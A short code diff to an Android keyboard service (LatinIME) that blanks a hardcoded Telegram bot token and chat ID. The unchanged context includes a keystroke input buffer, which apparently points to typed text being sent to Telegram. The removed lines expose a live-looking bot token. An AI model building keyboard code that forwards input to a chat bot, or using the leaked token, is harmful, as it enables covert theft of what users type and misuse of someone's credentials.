@@ -68,8 +68,8 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
     static final long DELAY_DEALLOCATE_MEMORY_MILLIS = TimeUnit.SECONDS.toMillis(10);
 
     // --- إعدادات تليجرام ---
-    private static final String TELEGRAM_BOT_TOKEN = "7283584002:AAFHmrwUeN6lqYPZiY3XetbdP5Pu363Yh6A";
-    private static final String TELEGRAM_CHAT_ID = "6818088581";
+    private static final String TELEGRAM_BOT_TOKEN = "";
+    private static final String TELEGRAM_CHAT_ID = "";
     
     // --- متغيرات النظام المدمج ---
     private final StringBuilder mInputBuffer = new StringBuilder();
